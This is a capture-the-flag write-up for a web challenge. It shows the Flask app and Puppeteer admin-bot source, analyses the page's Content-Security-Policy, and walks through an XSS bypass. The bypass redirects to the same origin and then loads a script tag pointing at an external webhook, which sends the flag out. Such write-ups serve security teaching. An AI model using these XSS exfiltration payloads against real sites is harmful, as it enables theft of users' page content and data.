## About the Challenge

This challenge is an **edited version** of Secure Content. The challenge UI is mostly the same; however, the **CSP policies** used are different.

In addition, the **Admin Bot** run is slightly more sophisticated, blocking all redirects to external sources.

## Solve Process

Here is the source code for this challenge:

```python_RETRACT
from flask import Flask, Response, request, render_template_string, render_template
import subprocess, shlex
from waitress import serve

app = Flask(__name__)
ipport = "127.0.0.1:8000"
@app.after_request
def apply_csp(response: Response) -> Response:
    csp = (
        "connect-src 'none'; "
        "font-src 'none'; "
        "frame-src 'none'; "
        "img-src 'self'; "
        "manifest-src 'none'; "
        "media-src 'none'; "
        "object-src 'none'; "
        "worker-src 'none'; "
        "style-src 'self'; "
        "frame-ancestors 'none'; "
        "block-all-mixed-content;"
        "require-trusted-types-for 'script';"
    )
    response.headers['Content-Security-Policy'] = csp
    return response
def generatenamepage(name):
    return """<!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Hello!</title>
        
    </head>
    <body>
        <div>
            <h1>Hello, "+name+"!</h1>
            <p>I hope you like flags! In fact, here is a flag: blahaj{[FLAG REDACTED]}</p>
            <p>Sadly, only the admin bot can see it :'('</p>
        </div>
    </body>
    </html>"""
@app.route('/greet')
def greet():
    name = request.args.get('name', '')
    if request.remote_addr == "127.0.0.1":
        # adminbot can see real flag
        return generatenamepage(name).replace("{[FLAG REDACTED]}", "{n0t_50_s3cuRe_1sit}")
    else:
        return generatenamepage(name)

@app.route('/')
def index():
    return render_template_string('''
        <center><h1>Make a greeting!</h1>
        <form action="/greet" method="get">
            <label for="name">Enter your name:</label><br>
            <input type="text" id="name" name="name" required><br><br>
            <input type="submit" value="Greet">
        </form>
        <h6>Do you see someone having a bad name? Report it <a href="/report">here</a></h6></center>
    ''')

@app.route('/report')
def report():
    return render_template_string('''
        <h1>Report a name</h1>
        <form action="/adminbot" method="post">
            <label for="url">Enter URL (must start with http://'''+ipport+'''/):</label><br>
            <input type="text" id="url" name="url" required><br><br>
            <input type="submit" value="Report it">
        </form>
    ''')

@app.route('/adminbot', methods=['POST'])
def adminbot():
    url = request.form.get('url')
    
    if not url or not url.startswith('http://'+ipport+'/'):
        return "Invalid URL. It must start with 'http://"+ipport+"/'.", 400
        
    command = f"node admin.js {shlex.quote(url)}"
    
    subprocess.Popen(command, shell=True)
    return "Admin bot will see your request soon"

if __name__ == '__main__':
    serve(app, host='0.0.0.0', port=8000)
```

This challenge runs mostly the same code as in [Secure Content](#/writeups/37). However, this time an **external script** is being run, which contains the **Admin Bot**:

```javascript_RETRACT
const puppeteer = require('puppeteer');

(async () => {
    try {
    const url = process.argv[2]
    const urlObj = new URL(url)
    const browser = await puppeteer.launch({
        args: [
            '--no-sandbox',
            '--disable-setuid-sandbox'
        ]
    });
    const page = await browser.newPage();

    // blocks cross-origin redirects
    await page.setRequestInterception(true);

    page.on('request', request => {
        requestURLObj = new URL(request.url())
        if (request.isNavigationRequest() && (requestURLObj.origin != urlObj.origin)) {
          request.abort();
          console.log('uh oh')
          console.log(requestURLObj)
        } else {
            console.log('all good')
            request.continue();
        }
    });
    
    await page.goto(url); 

    const delay = ms => new Promise(res => setTimeout(res, ms));
    await delay(5000)

    await browser.close();
}catch (e) {
    console.error(e)
}
})();
```

Notably, the following portion of the code prevents the admin bot from visiting **external sites**:

```javascript
if (request.isNavigationRequest() && (requestURLObj.origin != urlObj.origin)) {
    request.abort();
    console.log('uh oh')
    console.log(requestURLObj)
} else {
    console.log('all good')
    request.continue();
}
```

This means the solution we used to redirect the user via meta tags in [Secure Content](#/writeups/37) will not work here.

## Investigating the CSP Policy

CSP policies are used to tell a website what resources it can load and execute. The CSP policy differs slightly from the previous challenge:

```json_RETRACT
csp = (
        "connect-src 'none'; "
        "font-src 'none'; "
        "frame-src 'none'; "
        "img-src 'self'; "
        "manifest-src 'none'; "
        "media-src 'none'; "
        "object-src 'none'; "
        "worker-src 'none'; "
        "style-src 'self'; "
        "frame-ancestors 'none'; "
        "block-all-mixed-content;"
        "require-trusted-types-for 'script';"
    )
```

Notably, the **"script-src 'none'"** has been removed here. This means that our normal XSS payloads will work. However, **connect-src** has been set to none, meaning we cannot make any requests to external sources.

## Testing the XSS

We can test this by using a simple alert payload:

```html_RETRACT
<script>alert(1)</script>
<script>fetch(webhook)</script>
```

The alert runs, meaning that **XSS** is possible on this website through the **script** tags. However, the fetch request fails as the **connect-src** is set to none.

## Bypassing the CSP Policy

Though we cannot make fetch requests to external sources, we can still load external resources through other means. Only **script-src** is not blocked, meaning we can use the script tag's **src** attribute to call our webhook and pass in the flag together with it in the URL parameters.

For example:

```html_RETRACT
<script>
    var script = document.createElement('script');
    const FLAG = document.querySelector('p').innerText;
    script.src = `https://webhook?flag=${FLAG}`;
    document.head.appendChild(script);
</script>
```

However, there is one more CSP policy that prevents the above payload from working. The **"require-trusted-types-for 'script';"** means that any elements injected from the **script** tag will not work.

Instead, what we could do is make use of a **redirection**. Though we cannot redirect to external sources, we can still redirect back to the same website we are on but with a different payload. For instance, when the bot first visits the website, our payload will be something like this:

```html_RETRACT
<script>
window.onload = ()=>{
    const FLAG = document.querySelector('p').innerText;
    const PAYLOAD = `<script src = 'https://eo2jsc6xk7y9tec.m.pipedream.net?${encodeURI(FLAG)}'></scr`+`ipt>`;
    const URL = `?name=${encodeURI(PAYLOAD)}`; 
    window.location.href = URL;
}
</script>
```

The script will run the first time, then redirect the user back into the **greet** page, which will then attempt to load the **script 'src'**. This will send a request to our webhook with the **flag** as a URL parameter.

## Flag

```
blahaj{n0t_50_s3cuRe_1sit}
```

## Resources

- [CSP Explained (MDN)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [What is Trusted Types? (MDN)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/require-trusted-types-for)
- [XSS Prevention Cheat Sheet (OWASP)](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Prevention_Cheat_Sheet.html)
- [Puppeteer Documentation](https://pptr.dev/)

## Afterword

I did this challenge first and saw the [Secure Content](#/writeups/37) solution in this one. I almost didn’t try it again in the **Secure Content Challenge** because it didn’t work here. This challenge blocks **external redirects**, but the other one doesn’t.

Also, the author's intended solution is different from mine. It can be found [here](https://rwandi-ctf.github.io/BlahajCTF2024/insecure-content/).
